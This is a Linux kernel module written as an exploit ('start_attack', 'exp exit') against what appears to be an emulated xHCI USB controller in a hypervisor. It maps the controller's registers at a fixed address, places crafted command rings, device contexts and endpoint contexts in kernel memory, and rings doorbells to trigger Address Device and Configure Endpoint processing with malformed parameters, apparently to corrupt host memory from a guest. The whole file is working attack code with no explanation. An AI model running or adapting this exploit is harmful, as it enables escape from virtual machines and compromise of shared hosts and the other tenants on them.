#include <linux/module.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <asm/io.h>

#define MEM_AREA 0xfebf0000
#define TRB_CR_SLOTID_SHIFT 24
#define TRB_TR_CH 4
#define TRB_CR_DC 9
#define EP_TYPE_SHIFT 3
#define EP_TYPE_MASK 7
void *mem_base;

typedef enum TRBType {
    TRB_RESERVED = 0,
    TR_NORMAL,
    TR_SETUP,
    TR_DATA,
    TR_STATUS,
    TR_ISOCH,
    TR_LINK,
    TR_EVDATA,
    TR_NOOP,
    CR_ENABLE_SLOT,
    CR_DISABLE_SLOT,
    CR_ADDRESS_DEVICE,
    CR_CONFIGURE_ENDPOINT,
    CR_EVALUATE_CONTEXT,
    CR_RESET_ENDPOINT,
    CR_STOP_ENDPOINT,
    CR_SET_TR_DEQUEUE,
    CR_RESET_DEVICE,
    CR_FORCE_EVENT,
    CR_NEGOTIATE_BW,
    CR_SET_LATENCY_TOLERANCE,
    CR_GET_PORT_BANDWIDTH,
    CR_FORCE_HEADER,
    CR_NOOP,
    ER_TRANSFER = 32,
    ER_COMMAND_COMPLETE,
    ER_PORT_STATUS_CHANGE,
    ER_BANDWIDTH_REQUEST,
    ER_DOORBELL,
    ER_HOST_CONTROLLER,
    ER_DEVICE_NOTIFICATION,
    ER_MFINDEX_WRAP,
    /* vendor specific bits */
    CR_VENDOR_NEC_FIRMWARE_REVISION  = 49,
    CR_VENDOR_NEC_CHALLENGE_RESPONSE = 50,
}TRBType;

typedef struct TRB{
    u64 parameter;
    u32 status;
    u32 control;
}TRB;

typedef struct Ring{
    u64 dequeue;
    bool ccs;
}Ring;

void set_crcr_addr(u64 addr){
    u32 low_addr = addr & 0xFFFFFFFF;
    u32 high_addr = (addr >> 32) & 0xFFFFFFFF;
    writel(low_addr,mem_base+0x40+0x18);
    writel(high_addr,mem_base+0x40+0x1c);
}

void set_dcbaap_addr(u64 addr){
    u32 low_addr = addr & 0xFFFFFFFF;
    u32 high_addr = (addr >> 32) & 0xFFFFFFFF;
    writel(low_addr,mem_base+0x40+0x30);
    writel(high_addr,mem_base+0x40+0x34);
}

static int start_attack(void)
{
    void *crcr_addr;
    void *dcbaap_addr;
    void *trans_ring_addr;
    void *octx;
    void *ictx;
    void *trans_data;
    TRB *trb1_addr;

    mem_base = ioremap(MEM_AREA,0x4000);
    crcr_addr = kmalloc(0x4000,GFP_KERNEL);
    memset(crcr_addr,0,0x4000);
    dcbaap_addr = crcr_addr+0x2000; // +0x30 -> ep->pctx
    trans_ring_addr = crcr_addr+0x3000;

    set_crcr_addr(virt_to_phys(crcr_addr));
    set_dcbaap_addr(virt_to_phys(dcbaap_addr));

    ictx = crcr_addr+0x1000;
    ((u32 *)ictx)[0] = 0x0;  //ictl_ctx[0]
    ((u32 *)ictx)[1] = 0x3;  //ictl_ctx[1]
    ictx += 4;
    ((u32 *)ictx)[0] = 0x0;  //slot_ctx[0]
    ((u32 *)ictx)[1] = 1 << 16;  //slot_ctx[1]  // port
    ((u32 *)ictx)[2] = 0x5;  //slot_ctx[2]
    ((u32 *)ictx)[3] = 0x6;  //slot_ctx[3]
    ictx += 4;
    ((u32 *)ictx)[0] = (1 << 10) | (1 << 15) | (0 << 16);  //ep0_ctx[0]   // ep->max_pstreams // ep->lsa // ep->interval
    ((u32 *)ictx)[1] = (1 << EP_TYPE_SHIFT) | (0 << 16);  //ep0_ctx[1]   // ep->type // ep->max_psize
    ((u32 *)ictx)[2] = (virt_to_phys(trans_ring_addr) & 0xFFFFFFFF) | 1;  //ep0_ctx[2]   // low  ep->ring.dequeue   ep->ring.ccs
    ((u32 *)ictx)[3] = ((virt_to_phys(trans_ring_addr) >> 32) & 0xFFFFFFFF);  //ep0_ctx[3]   // high ep->ring.dequeue
    ((u32 *)ictx)[4] = 0x0;  //ep0_ctx[4]

    *(u64 *)(dcbaap_addr+8) = virt_to_phys(dcbaap_addr+0x10);  //poctx and octx
    octx = dcbaap_addr+0x10;

    trb1_addr = trans_ring_addr; // --------------setup trb-------------
    trb1_addr->parameter = 0x80; //USB_DIR_IN
    trb1_addr->status = 0x8;
    trb1_addr->control = (2 << 10) | 1 | (1 << 6); // type TR_SETUP TRB_TR_IDT
    trb1_addr = trans_ring_addr+0x10; // --------------status trb-------------
    trb1_addr->parameter = virt_to_phys(trans_ring_addr);
    trb1_addr->status = 0x8;
    trb1_addr->control = (4 << 10) | 1 | (0 << 4); // type TR_STATUS

    trb1_addr = crcr_addr;
    trb1_addr->parameter = virt_to_phys(crcr_addr+0x1000);  //ictx
    trb1_addr->status = 0xA;
    trb1_addr->control = (CR_ADDRESS_DEVICE << 10) | 1 | (1 << TRB_CR_SLOTID_SHIFT) | (1 << TRB_CR_DC);

    writel(0x0,mem_base+0x2000);//trigger process command  address_slot / set octx 

    set_crcr_addr(virt_to_phys(crcr_addr));

    ictx = crcr_addr+0x1000;
    ((u32 *)ictx)[0] = 0x0 & ~0x3; //ictl_ctx[0]
    ((u32 *)ictx)[1] = 0x1 | (1 << 2); //ictl_ctx[1]
    ictx += 32;
    ((u32 *)ictx)[0] = 0x3; //islot_ctx[0]
    ((u32 *)ictx)[1] = 0x3; //islot_ctx[1]
    ((u32 *)ictx)[2] = 0x3; //islot_ctx[2]
    ((u32 *)ictx)[3] = 0x3; //islot_ctx[3]

    ((u32 *)octx)[0] = 0x3; //slot_ctx[0]
    ((u32 *)octx)[1] = 0x3; //slot_ctx[1]
    ((u32 *)octx)[2] = 0x3; //slot_ctx[2]
    ((u32 *)octx)[3] = 2 << 27; //slot_ctx[3]

    ictx += 32*2; // 32*i, i start from 2;   --->ctx
    ((u32 *)ictx)[0] = (0 << 10) | (1 << 15) | (0 << 16); //ep_ctx[0] ep->max_pstreams / ep->lsa / ep->interval
    ((u32 *)ictx)[1] = (6 << 3) | (0 << 16); //ep_ctx[1] ep->type / ep->max_psize
    ((u32 *)ictx)[2] = (virt_to_phys(trans_ring_addr) & 0xFFFFFFFF) | 1; //ep_ctx[2] low  ep->ring.dequeue / ep->ring.css
    ((u32 *)ictx)[3] = ((virt_to_phys(trans_ring_addr) >> 32) & 0xFFFFFFFF); //ep_ctx[3] high ep->ring.dequeue
    ((u32 *)ictx)[4] = 0x3; //ep_ctx[4]

    octx += 32*2; // 32*i, i start from 2;   --->pctx

    trans_data = crcr_addr+0x3100;

    trb1_addr = trans_ring_addr; // --------------setup trb-------------
    trb1_addr->parameter = virt_to_phys(trans_data); // base addr
    trb1_addr->status = 0x100 & 0x1ffff;   // len
    trb1_addr->control = (TR_NORMAL << 10) | 1 | (1 << 4) | (0 << 6); // type / TRB_TR_IDT

    trb1_addr = trans_ring_addr+0x10; 
    trb1_addr->parameter = virt_to_phys(trans_data+0x10); // base addr
    trb1_addr->status = 0x101 & 0x1ffff;   // len
    trb1_addr->control = (TR_NORMAL << 10) | 1 | (1 << 4) | (0 << 6); // type / TRB_TR_IDT

    trb1_addr = trans_ring_addr+0x20; // --------------status trb-------------
    trb1_addr->parameter = virt_to_phys(trans_ring_addr);
    trb1_addr->status = 0x8;
    trb1_addr->control = (4 << 10) | 1 | (0 << 4); // type TR_STATUS


    trb1_addr = crcr_addr;
    trb1_addr->parameter = virt_to_phys(crcr_addr+0x1000);//ictx
    trb1_addr->status = 0xA;
    trb1_addr->control = (CR_CONFIGURE_ENDPOINT << 10) | 1 | (1 << TRB_CR_SLOTID_SHIFT) | (0 << TRB_CR_DC);

    writel(0x0,mem_base+0x2000);
    writel(0x2,mem_base+0x2000+4);

    return 0;
}

static void exit_attack(void)
{
	printk("exp exit.\n");
}

module_init(start_attack);
module_exit(exit_attack);

MODULE_LICENSE("GPL");